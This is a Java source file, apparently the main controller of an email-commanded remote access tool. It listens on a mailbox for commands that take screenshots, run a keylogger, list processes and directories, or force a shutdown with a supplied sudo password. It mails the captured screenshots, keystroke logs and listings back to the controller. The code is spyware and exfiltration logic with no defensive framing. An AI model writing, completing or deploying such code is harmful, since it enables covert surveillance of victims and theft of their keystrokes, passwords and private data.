package com.util;

import javax.mail.MessagingException;
import java.io.IOException;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;

public class MainClient {
    private static boolean takeShot(int id) {
        String subject = "res/" + id;
        try {
            SendMail.getInstance().sendMail(subject, null, Screenshot.getInstance().takeScreenShot());
            return true;
        } catch (IOException | MessagingException e) {
            e.printStackTrace();
            return false;
        }
    }


    private static boolean keyLog(int id, long time) {
        String filename = "KEY LOG" + ZonedDateTime.now().format(DateTimeFormatter
                .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
        try {
            KeyLogger.getInstance().startLog(filename, time);
            String subject = "res / " + id;
            SendMail.getInstance().sendMail(subject, null, filename);
            return true;
        } catch (IOException e) {
            System.out.println("Error log");
            e.printStackTrace();
            return false;
        } catch (MessagingException e) {
            System.out.println("Cannot send mail");
            e.printStackTrace();
            return false;
        }
    }

    private static boolean Shutdown(int id, String sudopass){
        try{
            ShutandLog.getInstance().Logout(sudopass);
            return true;
        }catch (Exception e){
            String subject = "res / " + id;
            try {
                SendMail.getInstance().sendMail(subject, "Can't Shutdown due to eror: " + e.toString(), null);
            }catch (IOException | MessagingException er){
                er.printStackTrace();
            }
            e.printStackTrace();
            return false;
        }
    }

    private static boolean ListProcess(int id){
        String subject = "res/"+id;
        try{
            SendMail.getInstance().sendMail(subject,null, ProcessPC.getInstance().ProcessList());
            return true;
        }catch(IOException | MessagingException e){
            e.printStackTrace();
            return false;
        }
    }

    private static boolean listDir(int id) {
        try {
            ListDir list = new ListDir("");
            String filename = "LIST DIR" + ZonedDateTime.now().format(DateTimeFormatter
                    .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
            list.listAll(filename);
            SendMail.getInstance().sendMail("res/" + id,null, filename);
            return true;
        } catch (IOException | MessagingException e) {
            System.out.println("error when list");
            e.printStackTrace();
            return false;
        }
    }

    public static boolean processRequest(String header) throws ArrayIndexOutOfBoundsException{
        String[] parts = header.split("/");
        System.out.println(Arrays.toString(parts));
        int id = Integer.parseInt(parts[1].trim());
        String command = parts[2].trim();
        if (command.equalsIgnoreCase("takeshot")) {
            return takeShot(id);
        }
        else if (command.equalsIgnoreCase("keylog")) {
            return keyLog(id, Long.parseLong(parts[3].trim()));
        }

        else if (command.equalsIgnoreCase("Shutdown")){
            if (parts.length > 3)
                return Shutdown(id,parts[3].trim());
            return Shutdown(id,"");
        } else if (command.equalsIgnoreCase("ListProcess")) {
            return ListProcess(id);
        }
        else if (command.equalsIgnoreCase("listdir")) {
            return listDir(id);
        }
        return false;
    }


    public static void main(String[] args) {
        System.out.println("Listeningg for request...");
        CheckMail.getInstance().listen();
    }
}
